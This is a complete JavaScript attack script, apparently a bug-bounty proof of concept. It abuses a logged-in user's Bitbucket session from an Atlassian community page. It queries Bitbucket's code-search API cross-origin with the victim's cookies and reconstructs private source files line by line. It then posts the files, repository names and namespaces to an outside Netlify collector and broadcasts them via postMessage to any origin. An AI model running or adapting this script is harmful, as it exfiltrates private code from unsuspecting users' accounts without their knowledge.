(async () => {
  "use strict";

  // ============================================================
  // CONFIG
  // ============================================================

  const COLLECT =
    "https://bb-code-search-dashboard-323.netlify.app/api/collect";

  const COLLECT_TOKEN =
    "471fa898513d8cfc8598831d874b3a57c1ad622e3a3ecac82250ee2036f0f9cb";

  const API =
    "https://bitbucket.org/gateway/api/devai-code-search/v1/search";

  const EXPECTED_ORIGIN = "https://community.developer.atlassian.com";

  const CONCURRENCY = 8;
  const MAX_RESULTS = 100;
  const MAX_RETRIES = 4;

  const BASE_RETRY_MS = 500;
  const MAX_RETRY_MS  = 10000;

  const GAP_FILL_THRESHOLD = 0.85;
  const MAX_GAP_QUERIES = 60;

  // ============================================================
  // LOG / METRICS
  // ============================================================

  const t0 = performance.now();
  let reqs = 0, errs = 0, rateLimits = 0, cacheHits = 0;

  const el = () => ((performance.now() - t0) / 1000).toFixed(1);

  const log     = (m, s = "color:#58a6ff;font-weight:bold") =>
    console.log(`%c[v14] ${m}`, s);
  const logOk   = m => log(m, "color:#3fb950;font-weight:bold");
  const logWarn = m => log(m, "color:#ffaa33");
  const logH    = m => log(m, "color:#b388ff;font-weight:bold");

  const sleep = ms => new Promise(r => setTimeout(r, ms));

  if (location.origin !== EXPECTED_ORIGIN) {
    logWarn(`Origin is ${location.origin}, expected ${EXPECTED_ORIGIN}. Collector CORS may reject.`);
  }

  // ============================================================
  // CONCURRENCY POOL
  // ============================================================

  let activeRequests = 0;
  const requestQueue = [];

  function acquireSlot() {
    if (activeRequests < CONCURRENCY) { activeRequests++; return Promise.resolve(); }
    return new Promise(r => requestQueue.push(r)).then(() => { activeRequests++; });
  }
  function releaseSlot() {
    activeRequests--;
    const next = requestQueue.shift();
    if (next) next();
  }
  async function withSlot(fn) {
    await acquireSlot();
    try { return await fn(); } finally { releaseSlot(); }
  }

  // ============================================================
  // SEARCH  (no ids anywhere)
  // ============================================================

  const searchCache = new Map();
  const makeKey = (t, f, c) => [t, f ? JSON.stringify(f) : "", c || ""].join("|||");

  async function codeSearch(term, extraFilters = null, cursor = null) {
    const key = makeKey(term, extraFilters, cursor);
    if (searchCache.has(key)) { cacheHits++; return searchCache.get(key); }

    const promise = (async () => {
      // ---- THE body: query + config ONLY ----
      const body = {
        query: { search_term: term },
        config: { max_results: MAX_RESULTS, search_mode: "LEXICAL" }
      };
      // filters key omitted unless needed (empty {} is rejected with 400)
      if (extraFilters) body.query.filters = extraFilters;
      if (cursor) body.pagination = { next_cursor: cursor };

      for (let attempt = 0; attempt < MAX_RETRIES; attempt++) {
        try {
          return await withSlot(async () => {
            const response = await fetch(API, {
              method: "POST",
              mode: "cors",
              credentials: "include",
              cache: "no-store",
              referrerPolicy: "strict-origin-when-cross-origin",
              headers: {
                "Content-Type": "application/json",
                "X-RovoDev-Xid": "bitbucket"
              },
              body: JSON.stringify(body)
            });
            reqs++;

            if (response.status === 401) {
              const e = new Error("HTTP_401_UNAUTHORIZED");
              e.auth = true;
              throw e;
            }
            if (response.status === 429) {
              rateLimits++;
              const retryAfter = Number(response.headers.get("Retry-After")) || 0;
              const e = new Error("RATE_LIMIT");
              e.rateLimit = true; e.retryAfter = retryAfter;
              throw e;
            }
            if (response.status >= 500) {
              const e = new Error(`HTTP_${response.status}`);
              e.transient = true;
              throw e;
            }
            if (!response.ok) {
              const e = new Error(`HTTP_${response.status}`);
              e.fatal = true;
              throw e;
            }
            return await response.json();
          });
        } catch (e) {
          if (attempt === MAX_RETRIES - 1 || e.auth || e.fatal) {
            errs++;
            logWarn(`Search failed: "${term}" (${e?.message || e})`);
            if (e.auth) {
              logWarn("401 — not signed in on bitbucket.org or third-party cookies blocked. Sign in to bitbucket.org, then re-run.");
            }
            return { matched_files: [], repositories: [] };
          }
          const wait = (e?.rateLimit && e.retryAfter > 0)
            ? e.retryAfter * 1000
            : Math.min(BASE_RETRY_MS * 2 ** attempt + Math.random() * 400, MAX_RETRY_MS);
          await sleep(wait);
        }
      }
      return { matched_files: [], repositories: [] };
    })();

    searchCache.set(key, promise);
    return promise;
  }

  async function searchAll(term, extraFilters = null) {
    const allF = [], allR = [];
    let cursor = null, page = 0, done = false;
    while (!done) {
      const data = await codeSearch(term, extraFilters, cursor);
      allF.push(...(data.matched_files || []));
      allR.push(...(data.repositories || []));
      cursor = data.pagination?.has_more ? data.pagination.next_cursor : null;
      page++;
      done = !cursor || page >= 40;
    }
    return { matched_files: allF, repositories: allR };
  }

  // ============================================================
  // LINE TRACKER
  // ============================================================

  class FileLines {
    constructor(repoName, path, language, repoId) {
      this.repoName = repoName; this.path = path;
      this.language = language; this.repoId = repoId;
      this.lines = new Map(); this.maxLine = 0;
    }
    addChunk(ch) {
      if (!ch?.source_code) return 0;
      const src = ch.source_code.split("\n");
      const start = ch.line_range?.start || 1;
      let added = 0;
      for (let i = 0; i < src.length; i++) {
        const ln = start + i;
        if (!this.lines.has(ln)) { this.lines.set(ln, src[i]); added++; }
        if (ln > this.maxLine) this.maxLine = ln;
      }
      return added;
    }
    get total()   { return this.maxLine; }
    get covered() { return this.lines.size; }
    get pct()     { return this.maxLine === 0 ? 0 : this.covered / this.maxLine * 100; }
    get gaps() {
      const r = []; let s = null;
      for (let i = 1; i <= this.maxLine; i++) {
        if (!this.lines.has(i)) { if (s === null) s = i; }
        else if (s !== null) { r.push([s, i - 1]); s = null; }
      }
      if (s !== null) r.push([s, this.maxLine]);
      return r;
    }
    reconstruct() {
      const out = [];
      for (let i = 1; i <= this.maxLine; i++) out.push(this.lines.get(i) ?? "");
      return out.join("\n");
    }
    gapWords() {
      const words = new Set();
      for (const [gs, ge] of this.gaps) {
        const from = Math.max(1, gs - 2);
        const to = Math.min(this.maxLine, ge + 2);
        for (let line = from; line <= to; line++) {
          if (line >= gs && line <= ge) continue;
          for (const tok of (this.lines.get(line) || "").split(/[^a-zA-Z0-9_]+/)) {
            if (tok.length >= 4) words.add(tok);
          }
        }
      }
      return words;
    }
    toPayload() {
      return {
        id: `${this.repoName}/${this.path}`,
        repoName: this.repoName,
        path: this.path,
        language: this.language || "Unknown",
        repoId: this.repoId,
        totalLines: this.total,
        coveredLines: this.covered,
        coverage: Math.round(this.pct * 10) / 10,
        gaps: this.gaps,
        sourceCode: this.reconstruct(),
        extractedAt: new Date().toISOString()
      };
    }
  }

  // ============================================================
  // STATE / INGEST
  // ============================================================

  const repos = new Map();
  const files = new Map();

  function ingest(results) {
    let added = 0;
    for (const repo of results.repositories || []) {
      if (!repos.has(repo.id)) repos.set(repo.id, repo);
    }
    for (const file of results.matched_files || []) {
      const repo = repos.get(file.repositoryId);
      const repoName = repo?.name || file.repositoryId;
      const filePath = file.path || file.name;
      const key = `${repoName}/${filePath}`;
      if (!files.has(key)) {
        files.set(key, new FileLines(repoName, filePath, file.language, file.repositoryId));
      }
      const tracked = files.get(key);
      for (const chunk of file.matched_chunks || []) added += tracked.addChunk(chunk);
    }
    return added;
  }

  // ============================================================
  // SEND — authenticated collector
  // ============================================================

  async function send(payload) {
    let receipt = null;
    try {
      const response = await fetch(COLLECT, {
        method: "POST",
        mode: "cors",
        credentials: "omit",
        cache: "no-store",
        headers: {
          "Content-Type": "application/json",
          "X-Poc-Token": COLLECT_TOKEN
        },
        body: JSON.stringify(payload)
      });

      const text = await response.text();
      try { receipt = JSON.parse(text); } catch { receipt = { raw: text }; }

      if (!response.ok) {
        logWarn(`Dashboard rejected sync: HTTP ${response.status} — ${text.slice(0, 300)}`);
        if (response.status === 401) logWarn("401 — x-poc-token mismatch.");
        if (response.status === 403) logWarn(`403 — origin ${location.origin} not allowlisted.`);
        receipt = null;
      } else {
        logOk("Dashboard sync accepted (authenticated).");
        window.__BB_DASHBOARD_RECEIPT__ = receipt;
      }
    } catch (e) {
      logWarn(`Dashboard send failed: ${e}. Run from ${EXPECTED_ORIGIN}.`);
    }
    try {
      if (window.opener) window.opener.postMessage({ type: "bb-code-extract", payload }, "*");
      if (window.parent !== window) window.parent.postMessage({ type: "bb-code-extract", payload }, "*");
    } catch {}
    return receipt;
  }

  // ============================================================
  // TERMS
  // ============================================================

  const UNIVERSAL_PUNCT = [".", "(", ")", "=", "{", "}", ",", ":", ";", "/"];
  const UNIVERSAL_KEYWORDS = ["function", "return", "class", "import", "const", "def", "if", "else"];
  const EXTENSIONS = [
    "py","go","js","ts","tsx","jsx","json","yaml","yml","sql","md",
    "txt","toml","ini","sh","rb","rs","java","c","cpp","h","hpp",
    "css","html","xml","cfg","conf","env","tf","hcl","Dockerfile","lock"
  ];

  // ============================================================
  // RUN
  // ============================================================

  logH("Starting v14 — zero-identifier body (no namespace / no uuid / no scope)...");
  logH(`Collector: ${COLLECT}`);

  logH("Phase A: universal term sweep (no filters)...");
  const primaryTerms = [...UNIVERSAL_PUNCT, ...UNIVERSAL_KEYWORDS];
  await Promise.all(primaryTerms.map(async t => { ingest(await searchAll(t)); }));
  logOk(`Phase A: ${repos.size} repos, ${files.size} files after ${reqs} requests / ${el()}s`);

  if (repos.size === 0 && files.size === 0) {
    logWarn("0 results. Check you're signed in on bitbucket.org (cookies + cross-site allowed), then re-run.");
  }

  logH("Phase B: extension sweep (or-list, no namespace)...");
  const extFilter = { or: EXTENSIONS.map(ext => ({ attribute: "extension", eq: ext })) };
  ingest(await searchAll(".", extFilter));
  logOk(`Phase B done at ${reqs} requests / ${el()}s`);

  const incomplete = [...files.values()].filter(f => f.pct / 100 < GAP_FILL_THRESHOLD);
  if (incomplete.length > 0) {
    logH(`Phase C: gap fill (${incomplete.length} files)...`);
    const wordFreq = new Map();
    const already = new Set(primaryTerms);
    for (const f of incomplete) {
      for (const w of f.gapWords()) {
        if (already.has(w)) continue;
        wordFreq.set(w, (wordFreq.get(w) || 0) + 1);
      }
    }
    const ranked = [...wordFreq.entries()]
      .sort((a, b) => b[1] - a[1])
      .slice(0, MAX_GAP_QUERIES)
      .map(([w]) => w);

    log(`  ${wordFreq.size} unique gap-words, using top ${ranked.length}`);
    for (let i = 0; i < ranked.length; i += CONCURRENCY) {
      if (![...files.values()].some(f => f.pct / 100 < GAP_FILL_THRESHOLD)) break;
      await Promise.all(ranked.slice(i, i + CONCURRENCY).map(async w => {
        ingest(await searchAll(w));
      }));
    }
  }

  // ============================================================
  // PAYLOAD
  // ============================================================

  const allFiles = [...files.values()];
  let totalLines = 0, coveredLines = 0;
  for (const f of allFiles) { totalLines += f.total; coveredLines += f.covered; }
  const observedCoverage = totalLines > 0 ? coveredLines / totalLines * 100 : 0;

  const namespaces = [...new Set([...repos.values()].map(r => r.ns).filter(Boolean))];

  const payload = {
    matched_files: allFiles.map(f => f.toPayload()),
    repositories: [...repos.values()].map(repo => ({
      id: repo.id, name: repo.name, url: repo.url, namespace: repo.ns || null
    })),
    metadata: {
      namespaces:       namespaces,
      namespaceSource:  "observed-from-responses",
      extractedAt:      new Date().toISOString(),
      apiCalls:         reqs,
      errors:           errs,
      rateLimits:       rateLimits,
      cacheHits:        cacheHits,
      concurrency:      CONCURRENCY,
      maxResults:       MAX_RESULTS,
      elapsed:          el() + "s",
      totalFiles:       files.size,
      totalRepos:       repos.size,
      totalLines:       totalLines,
      coveredLines:     coveredLines,
      observedCoverage: Number(observedCoverage.toFixed(1)),
      linesPerRequest:  reqs ? Math.round(coveredLines / reqs) : 0,
      method:           "zero-identifier-body-v14-authenticated"
    }
  };

  // ============================================================
  // SEND + SUMMARY
  // ============================================================

  logH("Sending to authenticated dashboard...");
  const receipt = await send(payload);

  logH("═══════════════════════════════════════════");
  logH("  COLLECTION COMPLETE");
  logH("═══════════════════════════════════════════");
  logOk(`  Repos:          ${repos.size}`);
  logOk(`  Files:          ${files.size}`);
  logOk(`  Namespaces:     ${namespaces.join(", ") || "(none)"}`);
  logOk(`  Observed lines: ${coveredLines}/${totalLines} (${observedCoverage.toFixed(1)}%)`);
  logOk(`  API calls:      ${reqs}`);
  logOk(`  Lines/request:  ${payload.metadata.linesPerRequest}`);
  logOk(`  Cache hits:     ${cacheHits}`);
  logOk(`  429 responses:  ${rateLimits}`);
  logOk(`  Errors:         ${errs}`);
  logOk(`  Time:           ${el()}s`);
  logOk(`  Dashboard sync: ${receipt ? "accepted" : "FAILED — see warnings"}`);
  logH("═══════════════════════════════════════════");

  const byRepo = new Map();
  for (const f of allFiles) {
    if (!byRepo.has(f.repoName)) byRepo.set(f.repoName, []);
    byRepo.get(f.repoName).push(f);
  }
  for (const [repoName, repoFiles] of byRepo) {
    let total = 0, covered = 0;
    for (const f of repoFiles) { total += f.total; covered += f.covered; }
    const pct = total > 0 ? covered / total * 100 : 0;
    log(`  ${repoName}: ${repoFiles.length} files, ${covered}/${total} (${pct.toFixed(1)}%)`);
    for (const f of repoFiles) {
      const complete = f.pct >= 100;
      log(
        `    ${complete ? "✓" : "⚠"} ${f.path} — ${f.covered}/${f.total} (${f.pct.toFixed(1)}%) [${f.language || "?"}]`,
        complete ? "color:#3fb950" : "color:#ffaa33"
      );
    }
  }

  window.__BB_CODE_SEARCH_RESULT__ = payload;
  logOk("Result saved to window.__BB_CODE_SEARCH_RESULT__");
  if (receipt) logOk("Receipt saved to window.__BB_DASHBOARD_RECEIPT__");

})();
